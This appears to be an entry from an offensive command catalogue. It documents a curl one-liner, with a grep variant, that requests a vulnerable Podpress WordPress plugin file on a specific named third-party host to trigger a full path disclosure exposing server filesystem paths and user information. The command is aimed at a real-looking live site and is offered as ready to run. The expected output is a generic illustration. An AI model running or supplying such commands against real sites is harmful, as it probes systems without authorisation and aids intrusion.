---
data: >-
  curl -s
  http://smarthistory.khanacademy.org/blog/wp-content/plugins/podpress/getid3/write.php
tags:
  - reconnaissance
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.277Z'
id: 02788447-39f8-47a1-b2ce-3e9935c260c1
verified: false
validated: true
submitted: true
---
# curl-access-vulnerable-endpoint

## Command

```bash
curl -s http://smarthistory.khanacademy.org/blog/wp-content/plugins/podpress/getid3/write.php
```

## Description

This command uses curl to send a GET request to the vulnerable write.php endpoint in the Podpress WordPress plugin, triggering a full path disclosure due to a PHP syntax error. It is used in reconnaissance to extract server filesystem paths and user information without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode: Suppresses the progress meter but not error messages | Yes |
| `http://...` | The target URL of the vulnerable PHP file | Yes |

## Examples

### Basic Usage

```bash
curl -s http://smarthistory.khanacademy.org/blog/wp-content/plugins/podpress/getid3/write.php
```

### Advanced Usage

```bash
curl -s -v http://smarthistory.khanacademy.org/blog/wp-content/plugins/podpress/getid3/write.php | grep -i "path"
```

This adds verbose output (-v) and pipes to grep for filtering path information.

## Expected Output

The command returns HTTP response body containing PHP error details, such as:
"Warning: include(/full/server/path/to/file): failed to open stream: No such file or directory in /full/server/path/to/write.php on line 42"
This reveals the absolute path and implies the running user from the error context.

## Related

- [[Related Procedure|procedures/Trigger-Full-Path-Disclosure-in-Podpress-Plugin]]
